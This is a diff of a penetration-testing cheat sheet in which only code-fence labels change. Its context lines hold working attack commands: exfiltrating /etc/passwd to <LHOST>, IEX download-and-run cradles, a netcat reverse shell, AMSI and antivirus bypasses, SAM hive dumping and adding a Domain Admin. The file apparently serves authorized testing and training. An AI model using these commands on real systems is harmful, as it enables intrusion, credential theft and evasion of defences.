@@ -172,7 +172,7 @@
 
 ### List available Versions
 
-```console
+```cmd
 C:\> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
 ```
 
@@ -336,7 +336,7 @@ $ ./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
 
 ##### With PowerShell Start-Process (saps)
 
-```console
+```cmd
 PS C:\> saps 'C:\chisel.exe' 'client <LHOST>:9002 R:3000:127.0.0.1:3000'
 ```
 
@@ -583,7 +583,7 @@ $ dig axfr @<RHOST> <DOMAIN>
 
 ### Dir
 
-```console
+```cmd
 C:\> dir flag* /s /p
 C:\> dir /s /b *.log
 ```
@@ -712,7 +712,7 @@ $ rlogin -l "$(cat /etc/passwd | base64)" -p <LPORT> <LHOST>
 
 ### Linux to Windows
 
-```console
+```cmd
 PS C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/<LOCAL_DIRECTORY>/<FILE>','C:\Users\<USERNAME>\Documents\<FILE>')"
 ```
 
@@ -722,7 +722,7 @@ PS C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<L
 $ impacket-smbserver <SHARE> . -smb2support
 ```
 
-```console
+```cmd
 C:\> copy * \\<LHOST>\<SHARE>
 ```
 
@@ -732,19 +732,19 @@ C:\> copy * \\<LHOST>\<SHARE>
 $ impacket-smbserver -smb2support share <FOLDER> -user <USERNAME> -password <PASSWORD>
 ```
 
-```console
+```cmd
 C:\> net use n: \\<LHOST>\share /user:<USERNAME> <PASSWORD>
 ```
 
 ### Windows to Linux using Invoke-Webrequest
 
-```console
+```cmd
 PS C:\> powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
 ```
 
 #### Short Version
 
-```console
+```cmd
 PS C:\> iwr <LHOST>/<FILE> -o <FILE>
 PS C:\> iwr <LHOST>/<FILE> -o <FILE> -useb
 PS C:\> iwr <LHOST>/<FILE> -o <FILE> -UseBasicParsing
@@ -3862,19 +3862,19 @@ $IPv4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandPrope
 
 ### Ping
 
-```console
+```cmd
 C:\> ping -n 1 <RHOST>
 ```
 
 ### Set Environment Variables
 
-```console
+```cmd
 C:\> sysdm.cpl
 ```
 
 ### Hide a File
 
-```console
+```cmd
 C:\> attrib +h <FILE>
 ```
 
@@ -4160,7 +4160,7 @@ $ pipenv shell
 
 ### Remote Port Forwarding
 
-```console
+```cmd
 C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:<RPORT>:127.0.0.1:3389 <LHOST>
 ```
 
@@ -4480,7 +4480,7 @@ $ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
 
 ##### WINDOWS JUMP SERVER
 
-```console
+```cmd
 C:\> where ssh
 C:\Windows\System32\OpenSSH\ssh.exe
 C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
@@ -4516,7 +4516,7 @@ $ find / -name plink.exe 2>/dev/null
 
 ##### WINDOWS JUMP SERVER
 
-```console
+```cmd
 C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
 ```
 
@@ -4547,7 +4547,7 @@ $ xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
 
 ##### WINDOWS JUMP SERVER
 
-```console
+```cmd
 C:\> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
 C:\> netstat -anp TCP | find "2222"
 C:\> netsh interface portproxy show all
@@ -4563,7 +4563,7 @@ $ ssh database_admin@192.168.50.10 -p2222
 
 ##### WINDOWS JUMP SERVER
 
-```console
+```cmd
 C:\> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 C:\> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
 ```
@@ -4588,19 +4588,19 @@ ipmo    // Import-Module
 
 ### General Usage
 
-```console
+```cmd
 PS C:\> Get-Help <COMMAND>
 ```
 
 #### Search for Files
 
-```console
+```cmd
 PS C:\> type <FILE> | findstr /l <STRING>
 ```
 
 #### Create Base64 Blob of a File
 
-```console
+```cmd
 PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
 ```
 
@@ -4616,31 +4616,31 @@ PS> $EncodedText
 
 #### Import Module to PowerShell cmdlet
 
-```console
+```cmd
 PS C:\> Import-Module .\<FILE>
 ```
 
 #### Create a .zip File
 
-```console
+```cmd
 PS C:\> Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
 ```
 
 #### Unzip a File
 
-```console
+```cmd
 PS C:\> Expand-Archive -Force <FILE>.zip
 ```
 
 #### Start a new Process
 
-```console
+```cmd
 PS C:\> Start-Process -FilePath "C:\nc64.exe" -ArgumentList "<LHOST> <LPORT> -e powershell"
 ```
 
 #### Check PowerShell Versions
 
-```console
+```cmd
 PS C:\> Set-ExecutionPolicy Unrestricted
 PS C:\> powershell -Command "$PSVersionTable.PSVersion"
 PS C:\> powershell -c "[Environment]::Is64BitProcess"
@@ -4648,13 +4648,13 @@ PS C:\> powershell -c "[Environment]::Is64BitProcess"
 
 #### Check Execution Policy
 
-```console
+```cmd
 PS C:\> Get-ExecutionPolicy
 ```
 
 ##### Allow Script Execution
 
-```console
+```cmd
 PS C:\> Set-ExecutionPolicy remotesigned
 PS C:\> Set-ExecutionPolicy unrestricted
 PS C:\> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
@@ -4662,14 +4662,14 @@ PS C:\> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
 
 ##### Script Execution Bypass
 
-```console
+```cmd
 PS C:\> powershell -ex bypass -File <FILE>.ps1
 PS C:\> powershell -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ```
 
 ### Invoke-Expression / Invoke-WebRequest
 
-```console
+```cmd
 PS C:\> iwr <LHOST>/<FILE>.ps1 -o <FILE>.ps1
 PS C:\> iwr http://<LHOST>/<FILE>.ps1 -o <FILE>.ps1
 PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1)
@@ -4678,13 +4678,13 @@ PS C:\> Invoke-Expression (Invoke-WebRequest http://<LHOST/<FILE>.ps1)
 
 #### Use Kerberos Tickets
 
-```console
+```cmd
 PS C:\> iwr -UseDefaultCredentials http://<RHOST>
 ```
 
 ### .NET Reflection
 
-```console
+```cmd
 PS C:\> $bytes = (Invoke-WebRequest "http://<LHOST>/<FILE>.exe" -UseBasicParsing ).Content
 PS C:\> $assembly = [System.Reflection.Assembly]::Load($bytes)
 PS C:\> $entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Program' }, 'First').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic')
@@ -4700,7 +4700,7 @@ Export-CliXml
 
 ### Switching Sessions in PowerShell
 
-```console
+```cmd
 PS C:\> $password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 PS C:\> $cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $password)
 PS C:\> Enter-PSSession -ComputerName <RHOST> -Credential $cred
@@ -4708,7 +4708,7 @@ PS C:\> Enter-PSSession -ComputerName <RHOST> -Credential $cred
 
 or
 
-```console
+```cmd
 PS C:\> $SecurePassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $SecurePassword)
 PS C:\> $Session = New-PSSession -Credential $Cred
@@ -4717,7 +4717,7 @@ PS C:\> Invoke-Command -Session $session -scriptblock { whoami }
 
 or
 
-```console
+```cmd
 PS C:\> $username = '<USERNAME>'
 PS C:\> $password = '<PASSWORD>'
 PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
@@ -4725,13 +4725,13 @@ PS C:\> $credential = New-Object System.Management.Automation.PSCredential $user
 PS C:\> Start-Process powershell.exe -Credential $credential
 ```
 
-```console
+```cmd
 PS C:\> powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
 ```
 
 ### Decryption
 
-```console
+```cmd
 PS C:\> $key = Get-Content ".\<FILE>"
 PS C:\> $pass = (Get-Content ".\<FILE>" | ConvertTo-SecureString -Key $key)
 PS C:\> $secret = (New-Object PSCredential 0, $pass).GetNetworkCredential().Password
@@ -4740,7 +4740,7 @@ PS C:\> echo $secret
 
 ### Scheduled Tasks
 
-```console
+```cmd
 PS C:\> Start-Job -ScriptBlock { C:\Windows\Tasks\<FILE>.exe }
 ```
 
@@ -4748,7 +4748,7 @@ PS C:\> Start-Job -ScriptBlock { C:\Windows\Tasks\<FILE>.exe }
 
 #### AntiVirus Bypass for Invoke-Expression (IEX)
 
-```console
+```cmd
 PS C:\> <COMMAND> | & ( $PsHOme[4]+$PShoMe[30]+'x')
 ```
 
@@ -4762,7 +4762,7 @@ $PSHome[30]    // equals "e"
 
 #### Alternative
 
-```console
+```cmd
 PS C:\> $eNV:COmSPeC[4,15,25]-JOiN''
 ```
 
@@ -4778,13 +4778,13 @@ $eNV:COmSPeC[25}    // equals "x"
 
 #### Test String
 
-```console
+```cmd
 PS C:\> $str = 'amsiinitfailed'
 ```
 
 #### AMSI Bypass
 
-```console
+```cmd
 PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
 ```
 
@@ -4792,51 +4792,51 @@ PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
 
 #### Show current User
 
-```console
+```cmd
 PS C:\> whoami /all
 PS C:\> getuserid
 ```
 
 #### Show Groups
 
-```console
+```cmd
 PS C:\> whoami /groups
 ```
 
 #### Get System Information
 
-```console
+```cmd
 PS C:\> systeminfo
 ```
 
 #### Get Process List
 
-```console
+```cmd
 PS C:\> Get-Process
 ```
 
 #### Get net user Information
 
-```console
+```cmd
 PS C:\> net users
 PS C:\> net users <USERNAME>
 ```
 
 #### Get User List
 
-```console
+```cmd
 PS C:\> Get-ADUser -Filter * -SearchBase "DC=<DOMAIN>,DC=LOCAL"
 ```
 
 #### Invoke-Expression File Transfer
 
-```console
+```cmd
 PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1) -UseBasicParsing)
 ```
 
 #### Add new Domain Administrator
 
-```console
+```cmd
 PS C:\> $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
 PS C:\> New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
 PS C:\> Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
@@ -4844,7 +4844,7 @@ PS C:\> Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
 
 #### Execute Commands in User Context
 
-```console
+```cmd
 PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
 PS C:\> $cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
 PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
@@ -4852,7 +4852,7 @@ PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage
 
 #### Execute Scripts with Credentials (Reverse Shell)
 
-```console
+```cmd
 PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 PS C:\> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
 PS C:\> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
@@ -4860,7 +4860,7 @@ PS C:\> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebCl
 
 #### New-PSSession
 
-```console
+```cmd
 PS C:\Users\<USERNAME>\Downloads\backups> $username = "<DOMAIN>\<USERNAME>"
 $username = "<DOMAIN>\<USERNAME>"
 PS C:\Users\<USERNAME>\Downloads\backups> $password = "<PASSWORD>"
@@ -4889,13 +4889,13 @@ whoami
 
 #### Check Port Status
 
-```console
+```cmd
 PS C:\> Test-NetConnection <RHOST> -p <RPORT>
 ```
 
 #### Connect to Azure
 
-```console
+```cmd
 PS C:\> Azure-ADConnect -server 127.0.0.1 -db ADSync
 ```
 
@@ -4903,79 +4903,79 @@ PS C:\> Azure-ADConnect -server 127.0.0.1 -db ADSync
 
 #### Out-Default
 
-```console
+```cmd
 PS C:\> &{ <COMMAND> }
 ```
 
 #### Read a File
 
-```console
+```cmd
 PS C:\> Get-Content <FILE>
 ```
 
 #### Show hidden Files
 
-```console
+```cmd
 PS C:\> Get-ChildItem . -Force
 ```
 
 or
 
-```console
+```cmd
 PS C:\> GCI -hidden
 ```
 
 #### Convert a File into Base64
 
-```console
+```cmd
 PS C:\> [convert]::ToBase64String((Get-Content -path "<FILE>" -Encoding byte))
 ```
 
 #### Directory Listing
 
-```console
+```cmd
 PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {ls 'C:\PATH\TO\DIRECTORY\'}
 ```
 
 #### Write to a File
 
-```console
+```cmd
 PS C:\> Invoke-Command -ComputerName <COMPUTERNAME> -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'C:\PATH\TO\FILE\<FILE>' -Value '<CONTENT>'}
 ```
 
 #### Move a File
 
-```console
+```cmd
 PS C:\> move-item -path C:\PATH\TO\FILE<FILE> -destination C:\PATH\TO\DESTINATION
 ```
 
 #### Create a .zip-File
 
-```console
+```cmd
 PS C:\> Compress-Archive -LiteralPath C:\PATH\TO\FOLDER\<FOLDER> -DestinationPath C:\PATH\TO\FILE<FILE>.zip
 ```
 
 #### Replace Text in File
 
-```console
+```cmd
 PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -ScriptBlock{((cat "C:\PATH\TO\FILE\<FILE>" -Raw) -replace '<TO_REPLACE>','cmd.exe /c <NEW_TEXT>') | set-content -path C:\PATH\TO\FILE\<FILE>} -credential $cred
 ```
 
 #### File Transfer
 
-```console
+```cmd
 PS C:\> &{ iwr -uri http://<LHOST>/<FILE>.exe -o 'C:\PATH\TO\DIRECTORY\<FILE>.exe'}
 ```
 
 #### Read PowerShell History
 
-```console
+```cmd
 PS C:\> type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 ```
 
 #### Read .lnk-Files
 
-```console
+```cmd
 PS C:\> $WScript = New-Object -ComObject WScript.Shell
 PS C:\> $shortcut = Get-ChildItem *.lnk
 PS C:\> $WScript.CreateShortcut($shortcut)
@@ -5153,7 +5153,7 @@ PS C:\Users\user\Downloads> reg save hklm\system system
 PS C:\Users\user\Downloads> reg save hklm\sam sam
 ```
 
-```console
+```cmd
 C:\> reg.exe save hklm\sam c:\temp\sam.save
 C:\> reg.exe save hklm\security c:\temp\security.save
 C:\> reg.exe save hklm\system c:\temp\system.save
@@ -5229,7 +5229,7 @@ $ rsync -av rsync://<RHOST>/<FILE>/<REMOTE_DIRECTORY> <LOCAL_DIRECTORY>
 
 ## RunAs
 
-```console
+```cmd
 C:\> runas /user:"<USERNAME>" cmd.exe
 ```
 
@@ -6042,7 +6042,7 @@ Windows Subsystem for Linux
 
 ### Set WSL Default Version
 
-```console
+```cmd
 PS C:\> wsl --set-default-version 1
 ```
 
